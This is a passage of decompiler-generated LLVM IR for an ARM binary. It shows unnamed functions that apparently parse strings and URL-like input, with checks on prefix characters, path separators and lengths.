  br i1 %v7_9858, label %.thread35, label %dec_label_pc_9868

.thread35:                                        ; preds = %bb194
  store i32 %v10_82f0, i32* @lr, align 4
  %v4_9860 = load i32, i32* %v11_82f4, align 4
  store i32 %v4_9860, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_989c

dec_label_pc_9868:                                ; preds = %bb194
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_986c = load i32, i32* %stack_var_-44, align 4
  %v0_9870 = load i32, i32* @r5, align 4
  %v2_9870 = add i32 %v0_9870, %v3_986c
  store i32 %v2_9870, i32* @r4, align 4
  store i32 %v2_9870, i32* %r0.global-to-local, align 4
  %v1_9878 = inttoptr i32 %v2_9870 to i8*
  %v2_9878 = call i32 @function_12370(i8* %v1_9878)
  store i32 ptrtoint ([5 x i8]* @global_var_197f8.44 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9878, i32* @r1, align 4
  %v0_9884 = load i32, i32* @r4, align 4
  store i32 %v0_9884, i32* %r0.global-to-local, align 4
  %v4_9888 = inttoptr i32 %v0_9884 to i8*
  %v5_9888 = call i32 @function_126cc(i8* %v4_9888, i32 %v2_9878, i32 ptrtoint ([5 x i8]* @global_var_197f8.44 to i32))
  store i32 %v5_9888, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9890 = load i32, i32* %stack_var_-44, align 4
  %v2_9894 = add i32 %v3_9890, %v5_9888
  store i32 %v2_9894, i32* %ip.global-to-local, align 4
  store i32 %v2_9894, i32* %stack_var_-44, align 4
  br label %dec_label_pc_989c

dec_label_pc_989c:                                ; preds = %.thread35, %dec_label_pc_9868
  %v0_9d28 = phi i32 [ %v4_9860, %.thread35 ], [ %v2_9894, %dec_label_pc_9868 ]
  %v0_989c = load i32, i32* @r5, align 4
  %v2_989c = add i32 %v0_989c, %v0_9d28
  %v3_989c = inttoptr i32 %v2_989c to i8*
  %v4_989c = load i8, i8* %v3_989c, align 1
  %v6_989c = zext i8 %v4_989c to i32
  store i32 %v6_989c, i32* %r3.global-to-local, align 4
  %v2_98a0 = icmp ugt i8 %v4_989c, 33
  store i1 %v2_98a0, i1* %cpsr_c.global-to-local, align 1
  %v7_98a0 = icmp eq i8 %v4_989c, 34
  store i1 %v7_98a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_98a0, label %dec_label_pc_9d28, label %dec_label_pc_98a8

dec_label_pc_98a8:                                ; preds = %dec_label_pc_9d28, %dec_label_pc_989c, %dec_label_pc_9d50
  %v0_98a8 = load i32, i32* @r5, align 4
  store i32 %v0_98a8, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_98b0 = inttoptr i32 %v0_98a8 to i8*
  %v3_98b0 = call i32 @function_12494(i8* %v2_98b0, i32 10)
  store i32 %v3_98b0, i32* %r0.global-to-local, align 4
  %v1_98b4 = add i32 %v3_98b0, -1
  store i32 %v1_98b4, i32* %r3.global-to-local, align 4
  %v2_98b8 = icmp ugt i32 %v1_98b4, 7
  store i1 %v2_98b8, i1* %cpsr_c.global-to-local, align 1
  %v7_98b8 = icmp eq i32 %v1_98b4, 8
  store i1 %v7_98b8, i1* %cpsr_z.global-to-local, align 1
  %v2_98bc = xor i1 %v2_98b8, true
  %v3_98bc = or i1 %v7_98b8, %v2_98bc
  br i1 %v3_98bc, label %dec_label_pc_98d0.preheader, label %dec_label_pc_98e4

dec_label_pc_98d0.preheader:                      ; preds = %dec_label_pc_98a8
  store i32 %v2_8764, i32* %r3.global-to-local, align 4
  %v6_98c0 = add i32 %v3_98b0, %v2_8764
  store i32 %v6_98c0, i32* @r4, align 4
  br label %dec_label_pc_98d0

dec_label_pc_98cc:                                ; preds = %dec_label_pc_98d0
  %v1_98cc = call i32 @function_15c58(i32 1)
  store i32 %v1_98cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98d0

dec_label_pc_98d0:                                ; preds = %dec_label_pc_98d0.preheader, %dec_label_pc_98cc
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_98d4 = call i32 @function_15b1c(i32* null)
  %v0_98d8 = load i32, i32* @r4, align 4
  %v3_98d8 = icmp uge i32 %v0_98d8, %v2_98d4
  store i1 %v3_98d8, i1* %cpsr_c.global-to-local, align 1
  %v9_98d8 = icmp eq i32 %v0_98d8, %v2_98d4
  store i1 %v9_98d8, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_98e0 = xor i1 %v9_98d8, true
  %v3_98e0 = and i1 %v3_98d8, %v2_98e0
  br i1 %v3_98e0, label %dec_label_pc_98cc, label %dec_label_pc_98e4

dec_label_pc_98e4:                                ; preds = %dec_label_pc_98d0, %dec_label_pc_98a8
  store i32 %v10_82f0, i32* @ip, align 4
  %v3_98e8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98e8, i32* @r4, align 4
  %v0_98ec = load i32, i32* @r5, align 4
  %v2_98ec = add i32 %v0_98ec, %v3_98e8
  store i32 %v2_98ec, i32* @r6, align 4
  store i32 %v2_98ec, i32* %r0.global-to-local, align 4
  %v1_98f4 = inttoptr i32 %v2_98ec to i8*
  %v2_98f4 = call i32 @function_12370(i8* %v1_98f4)
  store i32 ptrtoint ([5 x i8]* @global_var_197f0.42 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_98f4, i32* @r1, align 4
  %v0_9900 = load i32, i32* @r6, align 4
  store i32 %v0_9900, i32* %r0.global-to-local, align 4
  %v4_9904 = inttoptr i32 %v0_9900 to i8*
  %v5_9904 = call i32 @function_126cc(i8* %v4_9904, i32 %v2_98f4, i32 ptrtoint ([5 x i8]* @global_var_197f0.42 to i32))
  store i32 %v5_9904, i32* %r0.global-to-local, align 4
  %v2_9908 = icmp ugt i32 %v5_9904, 3
  store i1 %v2_9908, i1* %cpsr_c.global-to-local, align 1
  %v7_9908 = icmp eq i32 %v5_9904, 4
  store i1 %v7_9908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9908, label %dec_label_pc_9c14, label %dec_label_pc_9910

dec_label_pc_9910:                                ; preds = %dec_label_pc_98e4
  %v0_9910 = load i32, i32* @r5, align 4
  %v1_9910 = load i32, i32* @r4, align 4
  %v2_9910 = add i32 %v1_9910, %v0_9910
  %v3_9910 = inttoptr i32 %v2_9910 to i8*
  %v4_9910 = load i8, i8* %v3_9910, align 1
  %v6_9910 = zext i8 %v4_9910 to i32
  store i32 %v6_9910, i32* @r3, align 4
  %v2_9914 = icmp ugt i8 %v4_9910, 46
  store i1 %v2_9914, i1* %cpsr_c.global-to-local, align 1
  %v7_9914 = icmp eq i8 %v4_9910, 47
  store i1 %v7_9914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9914, label %dec_label_pc_9d70, label %dec_label_pc_991c

dec_label_pc_991c:                                ; preds = %dec_label_pc_9d8c, %dec_label_pc_9d70, %dec_label_pc_9cd8, %dec_label_pc_9cbc, %dec_label_pc_9910, %dec_label_pc_9db8, %dec_label_pc_9d04
  %v0_991c = load i32, i32* @sb, align 4
  %v1_9920 = add i32 %v0_991c, 1431
  store i32 %v1_9920, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_197cc.19 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_992c = inttoptr i32 %v1_9920 to i16*
  %v5_992c = call i32 @function_1513c(i16* %v4_992c, i32 ptrtoint ([4 x i8]* @global_var_197cc.19 to i32), i32 4)
  store i32 %v5_992c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_9934 = load i32, i32* @sl, align 4
  %v3_9934 = add i32 %v2_9934, -1448
  %v4_9934 = inttoptr i32 %v3_9934 to i8*
  store i8 10, i8* %v4_9934, align 1
  br label %dec_label_pc_87b4

dec_label_pc_993c:                                ; preds = %dec_label_pc_980c, %dec_label_pc_974c, %dec_label_pc_9720
  %v0_993c = load i32, i32* @fp, align 4
  store i32 %v0_993c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_197e4.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v5_994c = call i32 @function_12428(i32 %v2_8278, i32 %v0_993c, i32 ptrtoint ([5 x i8]* @global_var_197e4.40 to i32), i32 4)
  %v0_9950 = load i32, i32* @sb, align 4
  %v1_9954 = add i32 %v0_9950, 1431
  store i32 %v1_9954, i32* @r4, align 4
  store i32 %v5_994c, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19800.46 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_9954, i32* %r0.global-to-local, align 4
  %v3_9964 = inttoptr i32 %v1_9954 to i8*
  %v4_9964 = call i32 @function_1275c(i8* %v3_9964, i32 ptrtoint ([5 x i8]* @global_var_19800.46 to i32))
  store i32 %v4_9964, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9968 = icmp eq i32 %v4_9964, 0
  store i1 %v2_9968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9968, label %dec_label_pc_9b28, label %dec_label_pc_9970

dec_label_pc_9970:                                ; preds = %dec_label_pc_9b28, %dec_label_pc_993c
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_9974 = load i32, i32* @sl, align 4
  %v3_9974 = add i32 %v2_9974, -1448
  %v4_9974 = inttoptr i32 %v3_9974 to i8*
  store i8 7, i8* %v4_9974, align 1
  br label %dec_label_pc_9978

dec_label_pc_9978:                                ; preds = %bb200, %dec_label_pc_9970
  %v0_9978 = load i32, i32* @r5, align 4
  store i32 %v0_9978, i32* @r2, align 4
  %v0_997c = load i32, i32* @sl, align 4
  %v1_997c = add i32 %v0_997c, -1452
  %v2_997c = inttoptr i32 %v1_997c to i32*
  %v3_997c = load i32, i32* %v2_997c, align 4
  store i32 %v3_997c, i32* @r0, align 4
  store i32 %v2_8278, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_9988 = call i32 @function_14a54(i32 %v3_997c, i32 %v2_8278, i32 %v0_9978, i32 16384)
  store i32 %v4_9988, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_87b4

dec_label_pc_9990:                                ; preds = %dec_label_pc_8ce4
  %v0_9990 = call i32 @function_12f18()
  store i32 %v0_9990, i32* %r0.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_9998 = inttoptr i32 %v0_9990 to i32*
  store i32 104, i32* %v2_9998, align 4
  br label %dec_label_pc_8d14

dec_label_pc_99a0:                                ; preds = %dec_label_pc_8ec0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v0_99a8 = load i32, i32* @sl, align 4
  %v1_99a8 = add i32 %v0_99a8, 660
  %v2_99a8 = inttoptr i32 %v1_99a8 to i32*
  %v3_99a8 = load i32, i32* %v2_99a8, align 4
  store i32 %v3_99a8, i32* @r4, align 4
  %v3_99ac = call i32 @function_11a14(i32 36, i32* null)
  %v0_99b0 = load i32, i32* @r4, align 4
  store i32 %v0_99b0, i32* %r1.global-to-local, align 4
  store i32 %v3_99ac, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_99bc = load i32, i32* @r7, align 4
  store i32 %v0_99bc, i32* %r0.global-to-local, align 4
  %v4_99c0 = call i32 @function_12428(i32 %v0_99bc, i32 %v0_99b0, i32 %v3_99ac, i32 11)
  store i32 %v4_99c0, i32* %r0.global-to-local, align 4
  %v0_99c4 = load i32, i32* @sl, align 4
  %v1_99c4 = add i32 %v0_99c4, 660
  %v2_99c4 = inttoptr i32 %v1_99c4 to i32*
  %v3_99c4 = load i32, i32* %v2_99c4, align 4
  %v0_99c8 = load i32, i32* @r7, align 4
  %v2_99c8 = add i32 %v0_99c8, %v4_99c0
  store i32 %v2_99c8, i32* @r6, align 4
  store i32 %v4_99c0, i32* @r4, align 4
  %v2_99d0 = sub i32 %v3_99c4, %v4_99c0
  store i32 %v2_99d0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19808.48 to i32), i32* %r2.global-to-local, align 4
  %v0_99d8 = load i32, i32* @r8, align 4
  store i32 %v0_99d8, i32* %r3.global-to-local, align 4
  store i32 %v2_99c8, i32* %r0.global-to-local, align 4
  %v4_99e0 = call i32 @function_12428(i32 %v2_99c8, i32 %v2_99d0, i32 ptrtoint (i32* @global_var_19808.48 to i32), i32 %v0_99d8)
  store i32 %v4_99e0, i32* %r0.global-to-local, align 4
  %v0_99e4 = load i32, i32* @sl, align 4
  %v1_99e4 = add i32 %v0_99e4, 16
  %v2_99e4 = inttoptr i32 %v1_99e4 to i32*
  %v3_99e4 = load i32, i32* %v2_99e4, align 4
  store i32 %v3_99e4, i32* %r3.global-to-local, align 4
  %v1_99e8 = load i32, i32* @r4, align 4
  %v2_99e8 = add i32 %v1_99e8, %v4_99e0
  store i32 %v2_99e8, i32* @r5, align 4
  %v0_99ec = load i32, i32* @sb, align 4
  %v2_99ec = add i32 %v0_99ec, %v2_99e8
  store i32 %v2_99ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* @fp, align 4
  %v2_99f4 = icmp ugt i32 %v3_99e4, 3
  store i1 %v2_99f4, i1* %cpsr_c.global-to-local, align 1
  %v7_99f4 = icmp eq i32 %v3_99e4, 4
  store i1 %v7_99f4, i1* %cpsr_z.global-to-local, align 1
  %v3_99f8 = add i32 %v2_99ec, 2115
  %v4_99f8 = inttoptr i32 %v3_99f8 to i8*
  store i8 0, i8* %v4_99f8, align 1
  %v7_99fc = icmp sgt i32 %v3_99e4, 4
  br i1 %v7_99fc, label %dec_label_pc_9a00, label %dec_label_pc_9b5c

dec_label_pc_9a00:                                ; preds = %dec_label_pc_99a0, %dec_label_pc_9b5c, %dec_label_pc_9b6c
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v1_9a08 = load i32, i32* @sl, align 4
  %v2_9a08 = add i32 %v1_9a08, 12
  %v3_9a08 = inttoptr i32 %v2_9a08 to i32*
  store i32 -1, i32* %v3_9a08, align 4
  %v0_9a0c = load i32, i32* %r2.global-to-local, align 4
  %v1_9a0c = trunc i32 %v0_9a0c to i8
  %v2_9a0c = load i32, i32* @sl, align 4
  %v3_9a0c = add i32 %v2_9a0c, -1448
  %v4_9a0c = inttoptr i32 %v3_9a0c to i8*
  store i8 %v1_9a0c, i8* %v4_9a0c, align 1
  br label %dec_label_pc_87b4

dec_label_pc_9a14:                                ; preds = %bb189
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_9a20 = load i32, i32* @r5, align 4
  %v1_9a20 = add i32 %v0_9a20, 4
  %v2_9a20 = inttoptr i32 %v1_9a20 to i8*
  %v3_9a20 = load i8, i8* %v2_9a20, align 1
  %v4_9a20 = zext i8 %v3_9a20 to i32
  store i32 %v4_9a20, i32* %r3.global-to-local, align 4
  %v2_9a24 = icmp ugt i8 %v3_9a20, 114
  store i1 %v2_9a24, i1* %cpsr_c.global-to-local, align 1
  %v7_9a24 = icmp eq i8 %v3_9a20, 115
  store i1 %v7_9a24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a24, label %bb195, label %.thread38

bb195:                                            ; preds = %dec_label_pc_9a14
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread38

.thread38:                                        ; preds = %dec_label_pc_9a14, %bb195
  %v3_9a34 = phi i32 [ 7, %dec_label_pc_9a14 ], [ 8, %bb195 ]
  store i32 %v0_9a20, i32* %r0.global-to-local, align 4
  %v1_9a3c = load i32, i32* @r6, align 4
  %v2_9a3c = sub i32 %v1_9a3c, %v3_9a34
  store i32 %v2_9a3c, i32* %r2.global-to-local, align 4
  %v2_9a40 = add i32 %v3_9a34, %v0_9a20
  store i32 %v2_9a40, i32* %r1.global-to-local, align 4
  %v3_9a44 = inttoptr i32 %v0_9a20 to i8*
  %v4_9a44 = call i32 @function_15448(i8* %v3_9a44, i32 %v2_9a40, i32 %v2_9a3c)
  store i32 %v4_9a44, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v0_9a4c = load i32, i32* @r7, align 4
  store i32 %v0_9a4c, i32* %stack_var_-44, align 4
  store i32 %v2_8278, i32* %ip.global-to-local, align 4
  %v1_9a54 = load i32, i32* @r4, align 4
  %v2_9a54 = add i32 %v1_9a54, %v2_8278
  %v3_9a54 = inttoptr i32 %v2_9a54 to i8*
  %v4_9a54 = load i8, i8* %v3_9a54, align 1
  %v6_9a54 = zext i8 %v4_9a54 to i32
  store i32 %v6_9a54, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a58 = icmp eq i8 %v4_9a54, 0
  store i1 %v2_9a58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a58, label %dec_label_pc_9a9c, label %dec_label_pc_9a60

dec_label_pc_9a60:                                ; preds = %.thread38
  %v2_9a60 = icmp ugt i8 %v4_9a54, 46
  store i1 %v2_9a60, i1* %cpsr_c.global-to-local, align 1
  %v7_9a60 = icmp eq i8 %v4_9a54, 47
  store i1 %v7_9a60, i1* %cpsr_z.global-to-local, align 1
  %v1_9a64 = load i32, i32* @r5, align 4
  br i1 %v7_9a60, label %bb196, label %dec_label_pc_9a6c

bb196:                                            ; preds = %dec_label_pc_9a60
  store i32 %v1_9a64, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9c08

dec_label_pc_9a6c:                                ; preds = %dec_label_pc_9a60
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9a7c

dec_label_pc_9a74:                                ; preds = %dec_label_pc_9a7c
  %v2_9a74 = icmp ugt i8 %v4_9a88, 46
  store i1 %v2_9a74, i1* %cpsr_c.global-to-local, align 1
  %v7_9a74 = icmp eq i8 %v4_9a88, 47
  store i1 %v7_9a74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a74, label %dec_label_pc_9c08, label %dec_label_pc_9a7c

dec_label_pc_9a7c:                                ; preds = %dec_label_pc_9a74, %dec_label_pc_9a6c
  %v0_9a90 = phi i32 [ %v1_9a90, %dec_label_pc_9a74 ], [ 1, %dec_label_pc_9a6c ]
  store i32 %v0_9a90, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 %v0_9a90, i32* %stack_var_-44, align 4
  %v2_9a88 = add i32 %v0_9a90, %v1_9a64
  %v3_9a88 = inttoptr i32 %v2_9a88 to i8*
  %v4_9a88 = load i8, i8* %v3_9a88, align 1
  %v6_9a88 = zext i8 %v4_9a88 to i32
  store i32 %v6_9a88, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a8c = icmp eq i8 %v4_9a88, 0
  store i1 %v2_9a8c, i1* %cpsr_z.global-to-local, align 1
  %v1_9a90 = add i32 %v0_9a90, 1
  store i32 %v1_9a90, i32* %r2.global-to-local, align 4
  store i32 %v2_9a88, i32* %r1.global-to-local, align 4
  br i1 %v2_9a8c, label %dec_label_pc_9a9c, label %dec_label_pc_9a74

dec_label_pc_9a9c:                                ; preds = %dec_label_pc_9a7c, %.thread38, %dec_label_pc_9c08
  %v0_9a9c = load i32, i32* @r5, align 4
  store i32 %v0_9a9c, i32* %r0.global-to-local, align 4
  %v1_9aa0 = inttoptr i32 %v0_9a9c to i8*
  %v2_9aa0 = call i32 @function_12370(i8* %v1_9aa0)
  store i32 %v2_9aa0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9aa4 = icmp eq i32 %v2_9aa0, 0
  store i1 %v2_9aa4, i1* %cpsr_z.global-to-local, align 1
  %tmp197 = icmp slt i32 %v2_9aa0, 1
  br i1 %tmp197, label %dec_label_pc_9ac8, label %dec_label_pc_9aac

dec_label_pc_9aac:                                ; preds = %dec_label_pc_9a9c
  %v0_9aac = load i32, i32* @r5, align 4
  store i32 %v0_9aac, i32* %r0.global-to-local, align 4
  %v1_9ab0 = inttoptr i32 %v0_9aac to i8*
  %v2_9ab0 = call i32 @function_12370(i8* %v1_9ab0)
  store i32 %v2_9ab0, i32* %r0.global-to-local, align 4
  %v1_9ab4 = add i32 %v2_9ab0, -127
  %v2_9ab4 = icmp ugt i32 %v2_9ab0, 126
  store i1 %v2_9ab4, i1* %cpsr_c.global-to-local, align 1
  %v3_9ab4 = sub i32 126, %v2_9ab0
  %v4_9ab4 = and i32 %v3_9ab4, %v2_9ab0
  %v5_9ab4 = icmp slt i32 %v4_9ab4, 0
  %v6_9ab4 = icmp slt i32 %v1_9ab4, 0
  %v7_9ab4 = icmp eq i32 %v2_9ab0, 127
  store i1 %v7_9ab4, i1* %cpsr_z.global-to-local, align 1
  %v7_9ab8 = icmp sgt i32 %v2_9ab0, 127
  br i1 %v7_9ab8, label %.thread41, label %bb198

bb198:                                            ; preds = %dec_label_pc_9aac
  %v8_9ab8 = load i32, i32* @sb, align 4
  %v9_9abc = add i32 %v8_9ab8, 789
  store i32 %v9_9abc, i32* %r0.global-to-local, align 4
  %v8_9ac0 = load i32, i32* @r5, align 4
  store i32 %v8_9ac0, i32* %r1.global-to-local, align 4
  br label %.thread41

.thread41:                                        ; preds = %dec_label_pc_9aac, %bb198
  store i32 39624, i32* @lr, align 4
  %v3_9ac4 = xor i1 %v6_9ab4, %v5_9ab4
  %v4_9ac4 = or i1 %v7_9ab4, %v3_9ac4
  call void @__pseudo_cond_branch(i1 %v4_9ac4, i32 ptrtoint (i32* @global_var_12398.49 to i32))
  br label %dec_label_pc_9ac8

dec_label_pc_9ac8:                                ; preds = %dec_label_pc_9a9c, %.thread41
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9acc = load i32, i32* %stack_var_-44, align 4
  %v0_9ad0 = load i32, i32* @r5, align 4
  %v1_9ad0 = add i32 %v0_9ad0, 1
  store i32 %v1_9ad0, i32* @r5, align 4
  %v2_9ad4 = add i32 %v1_9ad0, %v3_9acc
  store i32 %v2_9ad4, i32* %r0.global-to-local, align 4
  %v1_9ad8 = inttoptr i32 %v2_9ad4 to i8*
  %v2_9ad8 = call i32 @function_12370(i8* %v1_9ad8)
  store i32 %v2_9ad8, i32* %r0.global-to-local, align 4
  %v2_9adc = icmp ugt i32 %v2_9ad8, 254
  store i1 %v2_9adc, i1* %cpsr_c.global-to-local, align 1
  %v7_9adc = icmp eq i32 %v2_9ad8, 255
  store i1 %v7_9adc, i1* %cpsr_z.global-to-local, align 1
  %v8_9ae0 = icmp sgt i32 %v2_9ad8, 255
  br i1 %v8_9ae0, label %dec_label_pc_8d40, label %dec_label_pc_9ae4

dec_label_pc_9ae4:                                ; preds = %dec_label_pc_9ac8
  %v0_9ae4 = load i32, i32* @sb, align 4
  %v1_9ae8 = add i32 %v0_9ae4, 533
  store i32 %v1_9ae8, i32* @r4, align 4
  store i32 %v1_9ae8, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9af4 = call i32 @function_12404(i32 %v1_9ae8, i32 255)
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9afc = load i32, i32* %stack_var_-44, align 4
  %v0_9b00 = load i32, i32* @r5, align 4
  %v2_9b00 = add i32 %v0_9b00, %v3_9afc
  store i32 %v2_9b00, i32* %r0.global-to-local, align 4
  %v1_9b04 = inttoptr i32 %v2_9b00 to i8*
  %v2_9b04 = call i32 @function_12370(i8* %v1_9b04)
  store i32 %v2_9b04, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9b08 = icmp eq i32 %v2_9b04, 0
  store i1 %v2_9b08, i1* %cpsr_z.global-to-local, align 1
  %tmp199 = icmp slt i32 %v2_9b04, 1
  br i1 %tmp199, label %dec_label_pc_8d40, label %dec_label_pc_9b10

dec_label_pc_9b10:                                ; preds = %dec_label_pc_9ae4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9b14 = load i32, i32* %stack_var_-44, align 4
  %v0_9b18 = load i32, i32* @r4, align 4
  store i32 %v0_9b18, i32* @r0, align 4
  %v0_9b1c = load i32, i32* @r5, align 4
  %v2_9b1c = add i32 %v0_9b1c, %v3_9b14
  store i32 %v2_9b1c, i32* %r1.global-to-local, align 4
  %v2_9b20 = inttoptr i32 %v0_9b18 to i8*
  %v3_9b20 = call i32 @function_12398(i8* %v2_9b20, i32 %v2_9b1c)
  store i32 %v3_9b20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8d40

dec_label_pc_9b28:                                ; preds = %dec_label_pc_993c
  %v0_9b28 = load i32, i32* @r4, align 4
  store i32 %v0_9b28, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_197cc.19 to i32), i32* %r1.global-to-local, align 4
  %v3_9b30 = inttoptr i32 %v0_9b28 to i8*
  %v4_9b30 = call i32 @function_1275c(i8* %v3_9b30, i32 ptrtoint ([4 x i8]* @global_var_197cc.19 to i32))
  store i32 %v4_9b30, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9b34 = icmp eq i32 %v4_9b30, 0
  store i1 %v2_9b34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9b34, label %bb200, label %dec_label_pc_9970

bb200:                                            ; preds = %dec_label_pc_9b28
  %v0_9b3c = load i32, i32* @fp, align 4
  %v1_9b3c = load i32, i32* @r5, align 4
  %v3_9b3c = icmp uge i32 %v0_9b3c, %v1_9b3c
  store i1 %v3_9b3c, i1* %cpsr_c.global-to-local, align 1
  %v9_9b3c = icmp eq i32 %v0_9b3c, %v1_9b3c
  store i1 %v9_9b3c, i1* %cpsr_z.global-to-local, align 1
  %v7_9b40 = icmp sgt i32 %v0_9b3c, %v1_9b3c
  %. = select i1 %v7_9b40, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_9b48 = trunc i32 %. to i8
  %v10_9b48 = load i32, i32* @sl, align 4
  %v11_9b48 = add i32 %v10_9b48, -1448
  %v12_9b48 = inttoptr i32 %v11_9b48 to i8*
  store i8 %v9_9b48, i8* %v12_9b48, align 1
  br label %dec_label_pc_9978

dec_label_pc_9b54:                                ; preds = %dec_label_pc_8f64
  %v0_9b54 = load i32, i32* @r4, align 4
  %v1_9b54 = trunc i32 %v0_9b54 to i8
  %v2_9b54 = load i32, i32* @sl, align 4
  %v3_9b54 = add i32 %v2_9b54, -1448
  %v4_9b54 = inttoptr i32 %v3_9b54 to i8*
  store i8 %v1_9b54, i8* %v4_9b54, align 1
  br label %dec_label_pc_87b4

dec_label_pc_9b5c:                                ; preds = %dec_label_pc_99a0
  %v0_9b5c = load i32, i32* @r6, align 4
  store i32 %v0_9b5c, i32* %r0.global-to-local, align 4
  %v1_9b60 = inttoptr i32 %v0_9b5c to i8*
  %v2_9b60 = call i32 @function_12370(i8* %v1_9b60)
  store i32 %v2_9b60, i32* %r0.global-to-local, align 4
  %v2_9b64 = icmp ugt i32 %v2_9b60, 126
  store i1 %v2_9b64, i1* %cpsr_c.global-to-local, align 1
  %v7_9b64 = icmp eq i32 %v2_9b60, 127
  store i1 %v7_9b64, i1* %cpsr_z.global-to-local, align 1
  %v8_9b68 = icmp sgt i32 %v2_9b60, 127
  br i1 %v8_9b68, label %dec_label_pc_9a00, label %dec_label_pc_9b6c

dec_label_pc_9b6c:                                ; preds = %dec_label_pc_9b5c
  %v0_9b6c = load i32, i32* @sl, align 4
  %v1_9b6c = add i32 %v0_9b6c, 16
  %v2_9b6c = inttoptr i32 %v1_9b6c to i32*
  %v3_9b6c = load i32, i32* %v2_9b6c, align 4
  %v1_9b70 = and i32 %v3_9b6c, 33554432
  %v2_9b70 = icmp ne i32 %v1_9b70, 0
  store i1 %v2_9b70, i1* %cpsr_c.global-to-local, align 1
  %v3_9b70 = mul i32 %v3_9b6c, 128
  %v1_9b74 = add i32 %v3_9b70, 1472
  %v0_9b78 = load i32, i32* @r6, align 4
  store i32 %v0_9b78, i32* %r1.global-to-local, align 4
  %v0_9b7c = load i32, i32* @sb, align 4
  %v2_9b7c = add i32 %v1_9b74, %v0_9b7c
  store i32 %v2_9b7c, i32* @r0, align 4
  %v2_9b80 = inttoptr i32 %v2_9b7c to i8*
  %v3_9b80 = call i32 @function_12398(i8* %v2_9b80, i32 %v0_9b78)
  store i32 %v3_9b80, i32* %r0.global-to-local, align 4
  %v0_9b84 = load i32, i32* @sl, align 4
  %v1_9b84 = add i32 %v0_9b84, 16
  %v2_9b84 = inttoptr i32 %v1_9b84 to i32*
  %v3_9b84 = load i32, i32* %v2_9b84, align 4
  %v1_9b88 = and i32 %v3_9b84, 33554432
  %v2_9b88 = icmp ne i32 %v1_9b88, 0
  store i1 %v2_9b88, i1* %cpsr_c.global-to-local, align 1
  %v3_9b88 = mul i32 %v3_9b84, 128
  %v1_9b8c = add i32 %v3_9b88, 1472
  %v0_9b90 = load i32, i32* @sb, align 4
  %v2_9b90 = add i32 %v1_9b8c, %v0_9b90
  store i32 %v2_9b90, i32* @r4, align 4
  store i32 %v2_9b90, i32* %r0.global-to-local, align 4
  %v1_9b98 = inttoptr i32 %v2_9b90 to i8*
  %v2_9b98 = call i32 @function_12370(i8* %v1_9b98)
  store i32 ptrtoint (i32* @global_var_1980c.51 to i32), i32* %r1.global-to-local, align 4
